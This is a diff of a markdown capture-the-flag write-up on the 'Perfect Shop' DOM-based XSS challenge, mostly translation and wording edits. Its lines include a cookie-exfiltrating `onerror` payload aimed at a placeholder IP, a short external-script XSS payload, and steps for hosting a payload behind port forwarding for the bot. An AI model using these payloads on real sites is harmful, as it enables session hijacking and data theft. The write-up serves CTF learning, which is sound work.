@@ -1,5 +1,5 @@
 # Perfect Shop
-*Marzo 2024 - DOM-based XSS*
+*March 2024 - DOM-based XSS*
 
 > "Do you like perfect things? Check out my new online shop!"
 
@@ -333,7 +333,7 @@ The presence of a bot effectively guarantees that we'll need to exploit a [clien
 There are three things that might raise eyebrows when conducting a static code analysis (I didn't notice two of these during the competition):
 - The entire input is being parsed and not [casted](https://en.wikipedia.org/wiki/Type_conversion), which means the parsed value and the unparsed value could be logically very different;
 - The only endpoint exempt from input sanitization is `/admin`, but some HTML tags could also be found in `/admin/:id` (they are different endpoints);
-- During the reporting phase, the report itself is related to the product with the ID passed by the parsed user, but the bot visits the product endpoint with the ID passed by the unparsed user. Connecting back to the first point, the values could be completely different from each other;
+- During the reporting phase, the report itself is related to the product with the parsed ID passed by the user, but the bot visits the product endpoint with the unparsed ID passed by the user. Connecting back to the first point, the values could be completely different from each other;
 
 #### Parsing
 The ID is parsed using the [parseInt()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt) function. As stated in the documentation, the only requirement for a string to be parsed as an integer is that it *starts* with a digit. But what happens if a string starts with a digit but contains other characters and symbols?
@@ -404,6 +404,8 @@ Jokes aside, initially, I didn't notice almost anything of what I've written so 
 I tend to overlook various things during the exploration of a challenge, so having access to the source code and the Dockerfile, I decided to disable all filters and gradually re-enable them as I adapted the payload to the various constraints imposed on me.
 
 #### First step: Reflected XSS without filters
+
+In the `server.js` file, I edited the following lines:
 
 ![Disabling XSS filter](./media/img/XSSfilterOFF.png)
 
@@ -486,7 +488,7 @@ On line 16, let's modify the sanitizer again to set it as in the original applic
 
 Once the application is rebuilt, you'll notice that none of the payloads used previously will work anymore, being replaced instead by an empty string.
 
-In this step, there are very few tricks that can be done. To solve this "node", one had to notice the error present in the sanitizer library, and during the competition, it was a far-from-immediate step.
+In this step, there are very few tricks that can be done. To solve this problem, one had to notice the error present in the sanitizer library, and during the competition, it was a far-from-immediate step.
 
 Let's say that for any reason, whether you tried to enter an `/admin` in the request as a query parameter, or during static analysis, you noticed that something was wrong with the sanitizer, now it's known that if `/admin` is a substring of the request URL (remember once again: query parameters are part of the URL), it will cause the sanitizer to ignore any type of XSS payload that is sent.
 
@@ -510,7 +512,7 @@ By doing this, you should again get the flag on the webhook as before. Now there
 This step didn't require any rocket science. Let's say I simply aimed to find the shortest possible payload with the same philosophy as the previous ones. For completeness, I'll add a subsection with the various things I tried during the competition.
 
 ##### What I Tried During the Competition
-- First of all, I tried several times to exploit [unicode normalization](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html), with a payload like [`<script src=//ﬀﬀ.pw>`](https://jlajara.gitlab.io/XSS_20_characters), but it seemed useless to me because it wouldn't have allowed me to exfiltrate the cookie (which is absolutely not true, I'll come back to this later) since I wouldn't have been able to append the contents of `document.cookie`, as the use of `src` alone wouldn't have allowed me to execute JavaScript code;
+- First of all, I tried several times to exploit [unicode normalization](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html), with a payload like [`<script src=//ﬀﬀ.pw>`](https://jlajara.gitlab.io/XSS_20_characters), but it seemed useless to me because it wouldn't have allowed me to exfiltrate the cookie (which is absolutely not true) since I wouldn't have been able to append the contents of `document.cookie`, as the use of `src` alone wouldn't have allowed me to execute JavaScript code;
   
 - I tried using `onerror` like this: `<img src/onerror=this.src='https://[IP]/'+document.cookie>`, but it still went beyond the allowed 50 characters;
   
@@ -553,13 +555,13 @@ Then, to expose the file containing the payload to the local network, you can us
 
 Opening it, you should be able to see the payload, which is not being executed. Do not be afraid; when this is included in the script tag, it will be executed as necessary.
 
-As all good kids know, it's the router that communicates with the fantastic world of the internet, not our device directly, which only receives and sends information via the router.
+As all good kids know, it's the router that communicates with the fantastic world of the internet, not our device directly, which only receives and sends information via the router. To find out what your external IP address is, you can use an online service like [whatismyip.com](https://www.whatismyip.com/). 
 
-To find out what your external IP address is, you can use an online service like [whatismyip.com](https://www.whatismyip.com/). At this point, we have almost everything: we know the IP address where the file to be included in the script tag passed to the bot will be located (i.e., the IP we just found), and we know the port on our device where our files are exposed (after all, we chose it).
+At this point, we have almost everything: we know the IP address where the file to be included in the script tag passed to the bot will be located (i.e., the IP we just found), and we know the port on our device where our files are exposed (after all, we chose it).
 
 But there's one step missing: the router is reachable from the outside world, but the server hosted on the device is only reachable within the local network. Somehow, we need to tell the router that when a request is received on a certain port, that request should be handled by the Python server.
 
-Port forwarding allows us to do this. The procedure for enabling it varies greatly depending on the router manufacturer.
+[Port forwarding](https://en.wikipedia.org/wiki/Port_forwarding) allows us to do this. The procedure for enabling it varies greatly depending on the router manufacturer.
 
 ![Example of port forwarding](./media/img/PortForwarding.png)
 
@@ -588,4 +590,4 @@ To recap:
 
 To anyone who managed to read this far, thank you from the bottom of my heart ❤️
 
-For any feedback, you can reach me on Discord: `titto_caru`
+For any feedback, you can reach me out on Discord: `titto_caru`
